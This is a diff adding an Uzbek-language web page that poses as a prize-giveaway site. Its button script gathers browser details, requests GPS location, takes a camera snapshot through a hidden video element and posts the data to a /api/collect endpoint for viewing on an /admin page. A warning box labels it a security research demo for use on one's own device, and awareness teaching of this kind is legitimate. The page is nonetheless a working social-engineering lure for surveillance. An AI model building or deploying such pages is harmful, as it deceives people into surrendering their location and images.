@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Maxsus Sovg'a!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        .gift-icon {
+            font-size: 100px;
+            margin: 20px 0;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        p {
+            color: #555;
+            margin: 15px 0;
+            font-size: 1.1em;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.3s;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+            margin-top: 30px;
+            padding: 20px;
+            text-align: left;
+            font-size: 0.9em;
+        }
+        .warning h3 {
+            margin-bottom: 10px;
+            color: #856404;
+        }
+        .warning ul {
+            margin-left: 20px;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Tabriklaymiz!</h1>
+        <div class="gift-icon">🎉</div>
+        <p>Siz maxsus sovg'ani yutib oldingiz!</p>
+        <p>Sovg'angizni olish uchun tugmani bosing</p>
+        
+        <button class="btn" id="claimBtn" onclick="claimGift()">
+            Sovg'ani Olish
+        </button>
+        
+        <div id="status"></div>
+
+        <!-- Yashirin video element (kamera uchun) -->
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" style="display: none;" width="320" height="240"></canvas>
+
+        <div class="warning">
+            <h3>⚠️ OGOHLANTIRISH - Xavfsizlik Demo</h3>
+            <p><strong>Bu sahifa xavfsizlik tadqiqoti uchun yaratilgan demo.</strong></p>
+            <ul>
+                <li>IP manzil avtomatik yig'iladi</li>
+                <li>GPS joylashuv so'raladi</li>
+                <li>Kamera ruxsati so'raladi</li>
+                <li>Faqat o'z qurilmangizda test qiling!</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        async function claimGift() {
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.textContent = 'Yuklanmoqda...';
+            
+            const collectedData = {
+                timestamp: new Date().toISOString(),
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height
+                },
+                browser: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform
+                }
+            };
+
+            // 1. GPS joylashuvni olish
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    } else {
+                        reject(new Error('Geolocation not supported'));
+                    }
+                });
+                
+                collectedData.location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                };
+            } catch (error) {
+                collectedData.location = { error: error.message };
+            }
+
+            // 2. Kameradan rasm olish
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true,
+                    audio: false 
+                });
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                
+                video.srcObject = stream;
+                
+                // Kamera tayyorlanguncha kutish
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Rasmga olish
+                context.drawImage(video, 0, 0, 320, 240);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                collectedData.camera = {
+                    captured: true,
+                    image: imageData.substring(0, 100) + '...' // Faqat boshi (to'liq yubormaslik uchun)
+                };
+                
+                // Kamerani o'chirish
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                collectedData.camera = { error: error.message };
+            }
+
+            // 3. Serverga yuborish
+            try {
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(collectedData)
+                });
+
+                if (response.ok) {
+                    status.className = 'success';
+                    status.textContent = '✅ Ma\'lumotlar muvaffaqiyatli yig\'ildi! /admin sahifasida ko\'ring.';
+                } else {
+                    status.className = 'error';
+                    status.textContent = '❌ Xatolik yuz berdi!';
+                }
+            } catch (error) {
+                status.className = 'error';
+                status.textContent = '❌ Server bilan bog\'lanishda xatolik: ' + error.message;
+            }
+
+            status.style.display = 'block';
+            btn.textContent = 'Sovg\'a Olindi';
+        }
+    </script>
+</body>
+</html>
